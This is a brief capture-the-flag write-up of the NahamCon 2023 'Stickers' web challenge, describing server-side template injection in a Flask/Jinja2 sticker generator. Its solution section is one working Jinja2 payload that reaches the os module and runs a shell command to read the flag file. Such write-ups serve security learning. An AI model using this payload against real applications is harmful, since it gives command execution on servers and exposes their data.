---
layout: page
title: "Stickers - NahamCon 2023 Writeup"
subtitle: "SSTI in a Python/Flask sticker generator. User input rendered directly via Jinja2 template without sanitization → OS command execution via __import__."
permalink: /ctf/writeups/challenges/web/stickers/
category: "web"
challenge_name: "Stickers"
difficulty: "Medium"
event: "NahamCon 2023"
points: "497"
solves: "88"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: NahamCon 2023
* **Difficulty**: Medium
* **Points**: 497
* **Solves**: 88
* **Category**: Web
* **Tags**: SSTI, Jinja2, Flask, RCE

---

## 📝 Description
SSTI in a Python/Flask sticker generator. User input rendered directly via Jinja2 template without sanitization → OS command execution via __import__.

---

## 💡 Solution / Approach
```python
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```
